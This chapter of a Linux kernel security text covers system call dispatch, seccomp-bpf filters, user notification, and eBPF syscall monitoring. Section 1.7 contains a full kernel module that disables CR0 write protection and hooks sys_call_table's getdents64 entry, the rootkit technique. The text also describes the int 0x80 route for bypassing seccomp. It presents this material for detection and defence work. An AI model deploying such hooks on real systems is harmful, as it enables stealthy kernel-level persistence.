# Domain 2, Chapter 2B — System Call Dispatch, Seccomp, and Process Interaction Primitives

> **Scope.** The Linux system call dispatch mechanism on x86_64, x86, AArch64, and ARM. The `entry_SYSCALL_64` entry point and the `sys_call_table`. The `pt_regs` structure and argument-passing conventions. The `syscall` instruction versus `int 0x80` versus `sysenter`. System call filtering with seccomp-bpf: `struct seccomp_data`, BPF filter programs, and every `SECCOMP_RET_*` action. The seccomp user notification mechanism (`SECCOMP_IOCTL_NOTIF_*`). The `io_uring` system call interface and its security implications. `userfaultfd` and its use in race condition exploitation. `pidfd` and `process_vm_readv`/`process_vm_writev` for cross-process memory access. `ptrace` internals: `PTRACE_PEEKDATA`, `PTRACE_POKEDATA`, `PTRACE_GETREGS`, `PTRACE_SETREGS`, `PTRACE_ATTACH`, `PTRACE_TRACEME`, `PTRACE_O_TRACESECCOMP`, `PTRACE_O_TRACEFORK`. The ptrace access mode checks and Yama LSM.
>
> **Prerequisites.** Chapter 2A. The page fault handler (§9) is where `userfaultfd` hooks in; the page table and VMA structures are referenced throughout. Domain 1 Chapter 1A §5 describes the kernel's `execve` path that sets up the initial process state these syscalls operate on.

---

## 1. System call dispatch on x86_64

### 1.1 The `syscall` instruction

On x86_64, the canonical system call entry mechanism is the `syscall` instruction (opcode `0F 05`). When executed:

1. The CPU saves `RIP` into `RCX` and `RFLAGS` into `R11`.
2. The CPU loads `RIP` from `IA32_LSTAR` MSR — this is the kernel's syscall entry point.
3. The CPU masks `RFLAGS` with `IA32_FMASK` MSR (clearing `IF` to disable interrupts, `TF`, `DF`, etc.).
4. The CPU switches to ring 0 using the `CS`/`SS` selectors in `IA32_STAR` MSR.
5. The CPU does **not** switch stacks — that is the kernel's responsibility.

The `IA32_LSTAR` MSR points at `entry_SYSCALL_64` (defined in `arch/x86/entry/entry_64.S`). This is the first kernel instruction executed on every 64-bit system call.

### 1.2 `entry_SYSCALL_64`

The entry stub performs the following in hand-written assembly:

**Switch to kernel stack.** The user stack pointer (`RSP`) is saved into the per-CPU `cpu_tss_rw.tss_sp2` (or the per-CPU scratch area), and `RSP` is loaded from the task's kernel stack pointer. With KPTI, the entry point first switches `CR3` to the kernel page tables (from the user-space page tables) before touching any kernel data.

**Save registers.** User-mode register values are pushed onto the kernel stack in the layout of `struct pt_regs`:

```c
struct pt_regs {
    unsigned long r15, r14, r13, r12;
    unsigned long bp;           /* rbp */
    unsigned long bx;           /* rbx */
    unsigned long r11, r10, r9, r8;
    unsigned long ax;           /* syscall number, then return value */
    unsigned long cx;           /* saved rip (from syscall) */
    unsigned long dx;
    unsigned long si;
    unsigned long di;
    unsigned long orig_ax;      /* original syscall number (preserved) */
    unsigned long ip;           /* return rip */
    unsigned long cs;
    unsigned long flags;        /* rflags */
    unsigned long sp;           /* user rsp */
    unsigned long ss;
};
```

`orig_ax` holds the original syscall number (preserved across the call for signal restart and ptrace); `ax` initially holds the same value but is overwritten with the return value on exit.

**Dispatch.** The syscall number (from `RAX`) is bounds-checked against `__NR_syscall_max` (currently around 450 on x86_64). If in range, the kernel indexes `sys_call_table[rax]` — a static array of function pointers, one per syscall — and calls the handler. If out of range, `sys_ni_syscall` (the "not implemented" stub) returns `-ENOSYS`.

Arguments are passed in registers, following the x86_64 syscall convention (which differs from the C ABI): `RDI` = arg1, `RSI` = arg2, `RDX` = arg3, `R10` = arg4, `R8` = arg5, `R9` = arg6. Note that `R10` replaces `RCX` (which the `syscall` instruction clobbers to save `RIP`).

**Return.** The handler's return value is placed in `RAX`. The exit path (`syscall_return_slowpath` or the fast `sysret` path) restores registers from `pt_regs`, checks for pending signals, audit, ptrace tracing, and seccomp, and executes `sysretq` to return to user mode. `sysretq` loads `RIP` from `RCX` and `RFLAGS` from `R11`, reverses the privilege transition, and resumes user code.

**The `sysret` bug.** On Intel CPUs, `sysretq` with a non-canonical `RCX` (return address) causes a `#GP` in ring 0 rather than ring 3, because the privilege transition hasn't completed yet. This was CVE-2014-4699: an attacker who could control `RCX` via ptrace could cause a kernel-mode `#GP` with a controlled instruction pointer. The kernel now validates the return address before `sysretq` and falls back to `iretq` (which is slower but safe) if it is non-canonical.

### 1.3 `int 0x80` (32-bit compatibility)

The legacy 32-bit system call mechanism uses `int 0x80`, which triggers interrupt vector 0x80. The kernel's IDT entry for vector 0x80 points at `entry_INT80_compat`. This path:

- Uses a **different syscall number table** (`ia32_sys_call_table`) with 32-bit syscall numbers.
- Reads arguments from **different registers**: `EBX` = arg1, `ECX` = arg2, `EDX` = arg3, `ESI` = arg4, `EDI` = arg5, `EBP` = arg6.
- Returns via `iret`.

A 64-bit process can execute `int 0x80` and get 32-bit syscall semantics — this is a deliberate compatibility feature but a security concern: it provides an alternative syscall entry path with different numbering, potentially bypassing seccomp filters that only filter the 64-bit table. Seccomp filters must inspect the `arch` field of `seccomp_data` and reject (or separately filter) calls from unexpected architectures.

### 1.4 `sysenter` / `sysexit` (32-bit fast path)

`sysenter` is Intel's pre-`syscall` fast system call mechanism, used on 32-bit x86. It is faster than `int 0x80` (no IDT lookup, no interrupt-gate overhead). On 64-bit kernels running 32-bit compatibility code, `sysenter` enters via `entry_SYSENTER_compat`. Arguments and numbering are the same as `int 0x80`.

AMD's equivalent on 32-bit is `syscall` with the 32-bit `STAR` MSR; on 64-bit AMD CPUs in 32-bit compat mode, `syscall` also works.

### 1.5 System call dispatch on AArch64

AArch64 uses the `SVC #0` instruction (supervisor call). The CPU traps to EL1 (kernel mode) through the exception vector table. The kernel's vector entry for synchronous exceptions dispatches based on the ESR (Exception Syndrome Register) to `el0_svc` (defined in `arch/arm64/kernel/entry.S` / `syscall.c`).

Arguments: `X0`–`X5` are args 1–6; `X8` is the syscall number. The return value goes in `X0`. The syscall table is `sys_call_table` with AArch64 numbering (which largely follows the "generic" numbering in `include/uapi/asm-generic/unistd.h`).

On 32-bit ARM: `SWI` instruction (software interrupt), with `R7` as the syscall number and `R0`–`R5` as arguments.

### 1.6 System call numbering

Each architecture has its own syscall number assignment. Key examples:

| Syscall      | x86_64 | x86 (32-bit) | AArch64 | ARM   |
|-------------|--------|--------------|---------|-------|
| `read`       | 0      | 3            | 63      | 3     |
| `write`      | 1      | 4            | 64      | 4     |
| `open`       | 2      | 5            | (N/A, use `openat`) | 5 |
| `close`      | 3      | 6            | 57      | 6     |
| `mmap`       | 9      | 90 (`mmap2`) | 222     | 192 (`mmap2`) |
| `execve`     | 59     | 11           | 221     | 11    |
| `clone`      | 56     | 120          | 220     | 120   |
| `openat`     | 257    | 295          | 56      | 322   |

AArch64 does not have legacy syscalls like `open`, `stat`, `lstat` — it only has their `*at` variants (`openat`, `fstatat`, etc.). The generic numbering was designed to be cleaner than the historical x86 accumulation.

The `__NR_*` constants are defined in `arch/*/include/generated/uapi/asm/unistd_64.h` (or equivalent) and are stable ABI — numbers are never reused or changed.

### 1.7 Syscall table hooking

The `sys_call_table` is a static array of function pointers in the kernel's `.rodata` section. On modern kernels (5.3+), it resides in read-only memory protected by the kernel's `set_memory_ro` / `set_memory_rw` mechanism and backed by the W^X enforcement in the `pageattr` subsystem. Despite this, rootkits have historically modified `sys_call_table` entries to redirect syscall handlers to attacker-controlled functions — a technique that remains a core conceptual building block for understanding kernel-level persistence.

The attack works as follows. The rootkit locates the `sys_call_table` base address (exported as a symbol in older kernels; discoverable via `/proc/kallsyms`, `/boot/System.map`, or by scanning kernel memory for known patterns). It then disables write protection on the page containing the table — either by clearing the WP (Write Protect) bit in `CR0`, or by using the kernel's own `set_memory_rw` to remap the page as writable. Once writable, the rootkit replaces a target entry (e.g., `sys_call_table[__NR_getdents64]` to hide directory entries, or `sys_call_table[__NR_kill]` to intercept signals) with a pointer to its own function. The hook function typically calls the original handler, filters or modifies the result, and returns.

The following kernel module illustrates the technique for educational and detection-engineering purposes. It hooks `getdents64` to observe directory listings — the same pattern used by rootkits to hide files:

```c
/* Educational: syscall table hook via CR0 WP bit clearing.
 * Tested on kernel 5.4. Modern kernels (5.7+) with static calls,
 * CONFIG_STATIC_CALL, and hardware CET make this significantly harder.
 * This code is for understanding the DETECTION surface, not for deployment.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>

static unsigned long *sys_call_table_ptr;

/* Original handler */
typedef asmlinkage long (*orig_getdents64_t)(unsigned int fd,
    struct linux_dirent64 __user *dirp, unsigned int count);
static orig_getdents64_t orig_getdents64;

/* Disable CR0 write-protect bit */
static inline void cr0_wp_off(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);  /* bit 16 = WP */
    write_cr0(cr0);
}

static inline void cr0_wp_on(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}

/* Hook: pass through to original, log the call */
static asmlinkage long hooked_getdents64(unsigned int fd,
    struct linux_dirent64 __user *dirp, unsigned int count)
{
    long ret = orig_getdents64(fd, dirp, count);
    /* A real rootkit would filter entries from ret here */
    pr_info("hook: getdents64 fd=%u returned %ld\n", fd, ret);
    return ret;
}

static int __init hook_init(void)
{
    sys_call_table_ptr = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table_ptr) {
        pr_err("hook: cannot locate sys_call_table\n");
        return -EFAULT;
    }

    orig_getdents64 = (orig_getdents64_t)sys_call_table_ptr[__NR_getdents64];

    cr0_wp_off();
    sys_call_table_ptr[__NR_getdents64] = (unsigned long)hooked_getdents64;
    cr0_wp_on();

    pr_info("hook: installed getdents64 hook\n");
    return 0;
}

static void __exit hook_exit(void)
{
    cr0_wp_off();
    sys_call_table_ptr[__NR_getdents64] = (unsigned long)orig_getdents64;
    cr0_wp_on();
    pr_info("hook: removed getdents64 hook\n");
}

module_init(hook_init);
module_exit(hook_exit);
MODULE_LICENSE("GPL");
```

Detection of syscall table modification: compare the runtime `sys_call_table` entries against the known-good values from `System.map` or the kernel image. Tools like `chkrootkit` and Volatility's `linux_check_syscall` plugin perform exactly this comparison. On kernels 5.7+, `kallsyms_lookup_name` is no longer exported to modules, which breaks the module's symbol resolution — but rootkits with arbitrary kernel read/write (e.g., via a vulnerability) can still locate the table by scanning. Modern mitigations include `CONFIG_STATIC_CALL` (which replaces indirect function pointers with direct call sites patched at boot), Control Flow Integrity (CFI, both Clang CFI and Intel CET), and hardware-enforced W^X via CR0.WP pinning (`native_write_cr0` wrapper refuses to clear WP in production kernels since 5.3).

### 1.8 KPTI impact on syscall performance

Kernel Page Table Isolation (KPTI), deployed universally after the Meltdown disclosure (CVE-2017-5754, January 2018), splits the page tables into a user-space set and a kernel-space set. The user-space tables map only a minimal kernel "trampoline" stub; the full kernel mapping is present only in the kernel-space tables. Every system call entry must switch from the user `CR3` to the kernel `CR3`, and the return path must switch back.

The performance cost is non-trivial. Each `CR3` write flushes the TLB (unless PCID — Process Context ID — is used to tag TLB entries). With PCID support (available on Intel Westmere and later, AMD Zen and later), the flush is limited to the entries tagged with the outgoing PCID, and the incoming PCID's entries may remain cached. Without PCID, every syscall round-trip incurs a full TLB flush, adding roughly 5-30% overhead depending on workload (syscall-heavy workloads like database operations see the worst impact).

The `entry_SYSCALL_64` path on a KPTI-enabled kernel looks like this at the assembly level: the trampoline code in the user-visible page tables loads the kernel `CR3` from a per-CPU variable (`this_cpu_read(cpu_tlbstate.loaded_mm_asid)`), executes the switch, and only then jumps to the main entry code in the full kernel mapping. On return, the exit trampoline switches `CR3` back to the user value before executing `sysretq`. This CR3 dance is visible in `arch/x86/entry/entry_64.S` under the `SWITCH_TO_KERNEL_CR3` and `SWITCH_TO_USER_CR3` macros.

For performance-sensitive workloads, the vDSO (Chapter 2A §7) avoids the syscall entirely for time-related calls (`clock_gettime`, `gettimeofday`), eliminating the KPTI penalty for those hot paths.

### 1.9 eBPF tracepoints on syscall entry/exit

The kernel exposes tracepoints at syscall boundaries that eBPF programs can attach to for observability and security monitoring. Two primary attachment points exist:

**Raw tracepoints** (`raw_syscalls:sys_enter` and `raw_syscalls:sys_exit`): these fire on every syscall entry and exit, respectively. The eBPF program receives the syscall number and the `pt_regs` pointer, from which it can extract all six arguments. These are the attachment points used by security-monitoring tools like Falco, Tracee (Aqua Security), and Tetragon (Cilium/Isovalent).

**Per-syscall tracepoints** (`syscalls:sys_enter_openat`, `syscalls:sys_exit_read`, etc.): fine-grained tracepoints generated automatically for each syscall. The eBPF program receives a struct with named fields for the arguments, making extraction cleaner but requiring a separate program per syscall of interest.

An eBPF program attached to `raw_syscalls:sys_enter` can implement policy enforcement that complements seccomp. Unlike seccomp-bpf (which uses cBPF and cannot dereference pointers), eBPF programs can use helper functions like `bpf_probe_read_user` to read the memory pointed to by syscall arguments — for example, reading the filename string passed to `openat`. This makes eBPF-based monitoring strictly more powerful than seccomp for inspection purposes, though eBPF programs attached to tracepoints cannot block syscalls in the same way seccomp can (they observe, not enforce, unless combined with LSM BPF hooks — see Chapter 2C §8 for LSM BPF).

The following BPF C skeleton (compiled with libbpf/CO-RE) attaches to the raw syscall entry tracepoint and logs `execve` calls with the filename argument:

```c
/* execve_monitor.bpf.c — eBPF program for syscall monitoring
 * Compile with: clang -O2 -target bpf -c execve_monitor.bpf.c -o execve_monitor.bpf.o
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define __NR_execve_x86_64 59
#define FNAME_LEN 256

struct event {
    u32 pid;
    u32 uid;
    u64 ts;
    char fname[FNAME_LEN];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

SEC("raw_tracepoint/sys_enter")
int trace_sys_enter(struct bpf_raw_tracepoint_args *ctx)
{
    unsigned long syscall_nr = ctx->args[1];
    struct pt_regs *regs;
    struct event *e;

    if (syscall_nr != __NR_execve_x86_64)
        return 0;

    regs = (struct pt_regs *)ctx->args[0];

    e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return 0;

    e->pid = bpf_get_current_pid_tgid() >> 32;
    e->uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    e->ts  = bpf_ktime_get_ns();

    /* Read the filename pointer from RDI (arg1 of execve) */
    const char *fname_ptr;
    bpf_probe_read_kernel(&fname_ptr, sizeof(fname_ptr), &regs->di);
    bpf_probe_read_user_str(e->fname, sizeof(e->fname), fname_ptr);

    bpf_ringbuf_submit(e, 0);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

This program fires on every syscall entry, filters for `execve` (NR 59 on x86_64), reads the filename from user memory via the `pt_regs` pointer, and pushes the event into a ring buffer that a user-space consumer reads. The pattern is the basis for runtime security tools that need to observe process creation, file access, network connections, and other sensitive operations without the limitations of seccomp's cBPF instruction set.

---

## 2. System call return values and error codes

On success, the return value is the result (e.g., file descriptor for `open`, byte count for `read`). On failure, the kernel returns a negative value `-errno` in the range `[-4095, -1]`. glibc's syscall wrappers detect this range, negate it, store the result in the thread-local `errno`, and return `-1`.

The `-4095` threshold is hardcoded: values in `[-4095, -1]` are always errors; values below `-4095` are legitimate large positive return values (e.g., from `mmap` returning a high address). This is why `mmap` cannot return addresses in the top 4095 bytes of the address space — the kernel reserves that range to distinguish error codes from addresses.

---

## 3. Seccomp-BPF

### 3.1 Overview

Seccomp (Secure Computing) is the kernel's system-call filtering mechanism. It intercepts system calls at the very beginning of the dispatch path (before arguments are copied from user space, before the syscall handler runs) and applies a BPF program that decides whether the call should proceed.

Three modes exist:

**`SECCOMP_MODE_STRICT` (1).** The original seccomp mode. Only `read`, `write`, `exit`, and `sigreturn` are permitted; everything else kills the process. Useful but inflexible.

**`SECCOMP_MODE_FILTER` (2).** The process installs a cBPF (classic BPF) program that is evaluated on every syscall. The program can inspect the syscall number, architecture, and arguments (but only their register values — not the memory they point to) and return a verdict. This is the mode used by all modern sandboxes (Chrome, Docker, systemd, Flatpak, Android's zygote).

Seccomp is enabled via `prctl(PR_SET_SECCOMP, mode, ...)` or `seccomp(SECCOMP_SET_MODE_FILTER, flags, prog)`. The latter is preferred; it supports the `SECCOMP_FILTER_FLAG_TSYNC` flag (apply the filter to all threads in the thread group simultaneously) and `SECCOMP_FILTER_FLAG_NEW_LISTENER` (return a notification fd — see §3.5).

Installing a filter requires either `CAP_SYS_ADMIN` or `PR_SET_NO_NEW_PRIVS` to be set (the latter prevents the filter from being used to escalate privilege by blocking setuid transitions — if a process can prevent `setuid(0)` from succeeding, it could manipulate a setuid program's behavior).

### 3.2 `struct seccomp_data`

The BPF program operates on a fixed input structure:

```c
struct seccomp_data {
    int   nr;                   /* syscall number */
    __u32 arch;                 /* AUDIT_ARCH_X86_64, AUDIT_ARCH_I386, etc. */
    __u64 instruction_pointer;  /* address of the syscall instruction */
    __u64 args[6];              /* syscall arguments (register values) */
};
```

**`nr`**: the syscall number. On x86_64, this is the 64-bit number if the call entered via `syscall`, or the 32-bit number if the call entered via `int 0x80` or `sysenter`.

**`arch`**: the audit architecture constant. `AUDIT_ARCH_X86_64` (0xC000003E) for 64-bit x86_64, `AUDIT_ARCH_I386` (0x40000003) for 32-bit x86. This field is critical: a seccomp filter that checks only `nr` without first checking `arch` is vulnerable to architecture-switching attacks — a 64-bit process can issue `int 0x80` with a 32-bit syscall number that maps to a different (and potentially dangerous) syscall in the 32-bit table.

**`instruction_pointer`**: the user-mode address of the `syscall`/`int 0x80`/`svc` instruction. Useful for distinguishing calls from trusted code regions (e.g., libc) from calls from JIT'd or injected code. However, it is not a strong security boundary because the attacker can arrange to call from any address they control.

**`args[6]`**: the raw register values of the six syscall arguments. For pointer arguments, these are the pointer values — not the data they point to. A BPF filter cannot dereference pointers; it can only check whether a pointer value falls within an expected range. This is a fundamental limitation: seccomp cannot filter on the contents of filenames, ioctl commands passed by pointer, or any other by-reference data. Time-of-check-to-time-of-use (TOCTOU) issues also apply: the memory the pointer references can change between the seccomp check and the kernel's copy-from-user, making argument-based filtering unreliable for pointer arguments. Register-value arguments (integers, flags, fd numbers) are safe to filter on.

### 3.3 BPF filter programs

Seccomp uses classic BPF (cBPF), not eBPF. A cBPF program is an array of `struct sock_filter { __u16 code; __u8 jt; __u8 jf; __u32 k; }` instructions. The instruction set is simple: load from the `seccomp_data` structure (by offset), load immediate, arithmetic, conditional jump, and return.

A typical filter skeleton:

```
BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch))
BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0)
BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)
BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr))
BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, 0, 1)
BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)
/* ... more syscall checks ... */
BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)  /* default deny */
```

This first validates the architecture (rejecting 32-bit calls), then switches on the syscall number. The default-deny at the end ensures any syscall not explicitly allowed is killed.

Filters are composable: multiple filters can be installed in sequence. They form a chain; every filter in the chain is evaluated, and the strictest verdict wins (lowest `SECCOMP_RET_*` value). A child process inherits the parent's filter chain and can only add more filters — never remove or modify existing ones. This ensures that privilege can only be reduced, never increased, across the filter chain.

### 3.4 Return actions

The BPF program returns a 32-bit value whose high 16 bits are the action and low 16 bits are action-specific data:

**`SECCOMP_RET_KILL_PROCESS` (0x80000000).** Kill the entire thread group (process) with `SIGSYS`. The strongest denial.

**`SECCOMP_RET_KILL_THREAD` (0x00000000).** Kill only the offending thread. Less useful in practice because it can leave the process in an inconsistent state.

**`SECCOMP_RET_TRAP` (0x00030000).** Deliver `SIGSYS` to the thread, with `si_syscall`, `si_arch`, and `si_call_addr` in the `siginfo_t`. The process can install a handler to emulate the syscall in user space. Used by some sandbox runtimes (e.g., gVisor's ptrace-based model before it moved to the platform model, and some library-OS approaches).

**`SECCOMP_RET_ERRNO` (0x00050000 | errno).** The syscall is not executed; the kernel returns `-errno` to the caller, where `errno` is the low 16 bits. The calling code sees a normal syscall failure. Used to gracefully deny syscalls (e.g., returning `EPERM` for `mount` so the program handles the error normally rather than crashing).

**`SECCOMP_RET_USER_NOTIF` (0x7FC00000).** The syscall is not executed; instead, a notification is sent to a supervisor process monitoring this seccomp filter's notification fd. The supervisor can inspect the syscall, perform it on behalf of the sandboxed process, and return the result. See §3.5.

**`SECCOMP_RET_TRACE` (0x7FF00000 | data).** The syscall is paused and the tracer (attached via ptrace with `PTRACE_O_TRACESECCOMP`) is notified. The tracer can inspect and modify the syscall number and arguments, skip the syscall entirely, or allow it. The low 16 bits are delivered to the tracer as `PTRACE_EVENT_SECCOMP` data. This is the mechanism container runtimes use for syscall emulation via ptrace (e.g., early gVisor, some strace implementations).

**`SECCOMP_RET_LOG` (0x7FFC0000).** Allow the syscall but log it (via audit). Useful for monitoring mode: install a filter that logs everything, observe which syscalls a program actually makes, then tighten the filter.

**`SECCOMP_RET_ALLOW` (0x7FFF0000).** Allow the syscall unconditionally.

The priority ordering (strictest wins): `KILL_PROCESS` < `KILL_THREAD` < `TRAP` < `ERRNO` < `USER_NOTIF` < `TRACE` < `LOG` < `ALLOW`. When multiple filters are chained, the lowest-valued (strictest) return across all filters is the final action.

### 3.5 Seccomp user notification

The user notification mechanism (`SECCOMP_RET_USER_NOTIF`) enables a **supervisor–supervised** model: a privileged supervisor process receives notifications about a sandboxed process's syscalls and can handle them on its behalf.

Setup: the sandboxed process (or its parent before `fork`) installs a filter with `SECCOMP_FILTER_FLAG_NEW_LISTENER`. The `seccomp()` syscall returns a notification file descriptor. This fd is passed (via `SCM_RIGHTS` or inheritance) to the supervisor.

When the sandboxed process makes a syscall that the filter returns `SECCOMP_RET_USER_NOTIF` for:

1. The sandboxed thread blocks in the kernel.
2. The supervisor reads a `struct seccomp_notif` from the notification fd via `ioctl(fd, SECCOMP_IOCTL_NOTIF_RECV, &notif)`:

```c
struct seccomp_notif {
    __u64 id;               /* unique notification ID */
    __u32 pid;              /* PID of the notifying thread */
    __u32 flags;
    struct seccomp_data data;  /* the seccomp_data for this syscall */
};
```

3. The supervisor inspects `data.nr` and `data.args`, optionally reads the supervised process's memory (via `/proc/PID/mem` or `process_vm_readv`) to dereference pointer arguments, performs whatever action is appropriate (e.g., opening a file on the supervised process's behalf using the supervisor's privileges), and responds:

```c
struct seccomp_notif_resp {
    __u64 id;               /* must match the notification's id */
    __s32 val;              /* return value (e.g., fd number) */
    __s32 error;            /* negated errno, or 0 for success */
    __u32 flags;            /* SECCOMP_USER_NOTIF_FLAG_CONTINUE */
};
```

4. `ioctl(fd, SECCOMP_IOCTL_NOTIF_SEND, &resp)` sends the response. The sandboxed thread wakes with `val`/`error` as if the syscall had completed.

`SECCOMP_IOCTL_NOTIF_ID_VALID` checks whether a notification is still pending (the supervised thread hasn't been killed or interrupted). This is important for TOCTOU safety: between the supervisor reading the notification and acting on it, the supervised process could exit, and its PID could be recycled.

`SECCOMP_USER_NOTIF_FLAG_CONTINUE` allows the supervisor to say "actually, let the kernel handle this syscall normally." This is useful when the supervisor decides the call is safe after inspection. However, `CONTINUE` reintroduces the TOCTOU window: between the supervisor's inspection and the kernel's execution, the supervised process's memory (and thus pointer arguments) could change. `CONTINUE` should only be used when the syscall's arguments are non-pointer or when the TOCTOU risk is acceptable.

The supervisor model is used by container runtimes (Docker's seccomp notifier, Kubernetes's seccomp profiles with notification), by Flatpak for portal-mediated file access, and by some sandboxing libraries (e.g., `libseccomp`'s notification support).

### 3.6 Writing seccomp filters with libseccomp

The `libseccomp` library provides a high-level C API that generates cBPF bytecode from rule specifications, eliminating the need to construct raw `sock_filter` arrays by hand. The following complete program installs a default-deny filter that allows only a controlled set of syscalls — the pattern used by container runtimes and application sandboxes:

```c
/* seccomp_sandbox.c — libseccomp-based sandbox
 * Build: gcc -o seccomp_sandbox seccomp_sandbox.c -lseccomp
 * Requires: libseccomp-dev (Debian/Ubuntu) or libseccomp-devel (RHEL)
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <errno.h>

int main(void)
{
    scmp_filter_ctx ctx;

    /* Prevent privilege escalation across execve */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) {
        perror("prctl(NO_NEW_PRIVS)");
        return 1;
    }

    /* Default action: kill the process on any non-allowed syscall */
    ctx = seccomp_init(SCMP_ACT_KILL_PROCESS);
    if (ctx == NULL) {
        fprintf(stderr, "seccomp_init failed\n");
        return 1;
    }

    /* Allow essential I/O and process lifecycle */
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mmap), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(munmap), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigaction), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0);

    /* Allow write(2) only to stdout and stderr (fd 1 and 2) */
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,
                     SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO));
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,
                     SCMP_A0(SCMP_CMP_EQ, STDERR_FILENO));

    /* Block execve entirely — return EPERM instead of killing */
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(execve), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(execveat), 0);

    /* Load the filter into the kernel */
    if (seccomp_load(ctx) < 0) {
        perror("seccomp_load");
        seccomp_release(ctx);
        return 1;
    }

    seccomp_release(ctx);

    /* Sandboxed code runs here */
    printf("Sandbox active. PID: %d\n", getpid());

    /* This would be killed by the filter: */
    /* execl("/bin/sh", "sh", NULL); */

    return 0;
}
```

`libseccomp` handles architecture validation internally — it generates the `arch` check automatically and handles the 32-bit/64-bit numbering translation. The `SCMP_A0`/`SCMP_A1`/... macros allow argument-based filtering (comparing register-value arguments only; the pointer-dereference limitation still applies).

### 3.7 Raw BPF bytecode construction

For cases where `libseccomp` is not available (embedded systems, minimal containers, or when precise control over the BPF program is required), filters can be constructed as raw `sock_filter` arrays. The following example builds a minimal default-deny filter that allows only `read`, `write`, `exit`, and `exit_group`, rejecting everything else with `SECCOMP_RET_KILL_PROCESS`:

```c
/* raw_seccomp.c — Manual BPF bytecode seccomp filter */
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

int main(void)
{
    struct sock_filter filter[] = {
        /* [0] Load arch from seccomp_data */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, arch)),
        /* [1] If arch == AUDIT_ARCH_X86_64, jump to [3] */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K,
                 AUDIT_ARCH_X86_64, 1, 0),
        /* [2] Wrong arch: kill */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        /* [3] Load syscall number */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),
        /* [4] read (NR 0) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read, 4, 0),
        /* [5] write (NR 1) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, 3, 0),
        /* [6] exit (NR 60) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit, 2, 0),
        /* [7] exit_group (NR 231) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit_group, 1, 0),
        /* [8] Default: kill */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        /* [9] Allow */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };

    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };

    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) {
        perror("prctl");
        return 1;
    }

    if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog) < 0) {
        perror("seccomp");
        return 1;
    }

    /* Only read/write/exit/exit_group work from here */
    const char msg[] = "Seccomp filter active.\n";
    write(STDOUT_FILENO, msg, sizeof(msg) - 1);

    return 0;
}
```

Each `BPF_STMT` and `BPF_JUMP` macro compiles to a single `struct sock_filter` (4 fields, 8 bytes). The `jt` and `jf` fields in `BPF_JUMP` are relative offsets (number of instructions to skip) for the true and false branches, respectively. The program is verified by the kernel's BPF verifier at install time: it must terminate (no loops), must not exceed `BPF_MAXINSNS` (4096) instructions, and must return a valid `SECCOMP_RET_*` value on every path.

